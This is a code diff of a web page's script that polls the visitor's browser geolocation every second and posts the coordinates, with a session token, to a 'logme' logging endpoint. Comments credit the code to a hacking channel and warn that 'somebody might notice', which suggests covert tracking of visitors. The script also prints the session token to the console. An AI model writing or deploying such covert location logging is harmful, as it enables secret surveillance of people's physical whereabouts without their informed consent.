@@ -33,32 +33,23 @@
 <!-- The basis for this JS is the part I heartlessly stole from DemmSec - props to those guys for being fantastic -->
 <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script> <!-- jQuery -->
 <script type="text/javascript">
-var token = "<?php echo $_SESSION['token'] ?>"; // We need this on the client side so we can send it with the request in order to identify ourselves
-function httpGet(url) { // This should be done as POST to follow proper HTTP etiquette
-	var xmlHttp = new XMLHttpRequest();
-	xmlHttp.open("GET", url, false); // False means synchronous
-	xmlHttp.send(null);
-	return xmlHttp.responseText;
-
-	// Rewrite in jQuery.get()?
-	//$.get(url, function(data){
-	//	
-	//});
+function postData(url, _token, _lat, _long) {
+	$.post(url, {token: _token, latitude: _lat, longitude: _long})
+			.done(function(data) {
+				console.log("Location data sent");	
+			});
 }
 
 function autoUpdate() {
 	navigator.geolocation.getCurrentPosition(function(position) {
-		coords = position.coords.latitude + "," + position.coords.longitude;
-		url = "/logme/logme.php?";
-		//httpGet(url);
-		console.log("Works! Coords: " + coords); // Keep this commented out in production, somebody might notice
+		postData("../logme/index.php", "<?php echo $_SESSION['token'] ?>", position.coords.latitude, position.coords.longitude);
+		console.log("<?php echo $_SESSION['token'] ?>");
 		setTimeout(autoUpdate, 1000);
 	});
 }
 
 $(document).ready(function() {
-		autoUpdate();
-		console.log(token);
+	autoUpdate();
 });
 </script>
 </head>
